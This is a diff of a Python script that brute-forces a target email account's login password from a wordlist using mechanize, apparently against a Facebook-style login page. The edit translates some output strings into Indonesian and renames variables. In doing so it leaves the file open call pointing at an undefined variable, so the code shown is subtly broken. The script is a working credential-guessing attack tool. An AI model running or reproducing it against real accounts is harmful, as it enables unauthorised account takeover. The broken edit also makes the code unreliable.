@@ -47,11 +47,11 @@ def Main():
    (options,args) = parse.parse_args()
    if options.taremail !=None and options.wlst !=None: 
      user = options.taremail
-     passw = options.wlst
+     pass_file = options.wlst
      global check
      if check == True:
 	         try:
-		    passwfile = open(passw,'r')
+		    pass_file = open(file_path,'r')
 		 except:
                         print("\n[!] No Such File: "+passw+"  !!!\n")
                         exit(1)
@@ -68,7 +68,7 @@ def Main():
 		 print("\n[$]--- Brute Force Attack Start ---[$]\n")
 		 time.sleep(0.8)
 		 lo = 1
-		 for password in passwfile:
+		 for password in pass_file:
 				          try:
                 		             br1=mechanize.Browser()
                 		             br1.set_handle_robots(False)
@@ -82,12 +82,12 @@ def Main():
                 		             res = br1.submit()
 					     result = res.get_data()
 					     if "home_icon" in result:
-                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
+                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes/Ya :)".format(lo,password.strip()))
                    			        print ("\n[*] Found! Password is ==> "+ password)
 					        break
 						
                 		             else:
-                    			          print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
+                    			          print('[-]~[{}] Testing password[ {} ] ==> No/Bukan :('.format(lo,password.strip()))
                     			          lo +=1
             			          except KeyboardInterrupt:
                                                  print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
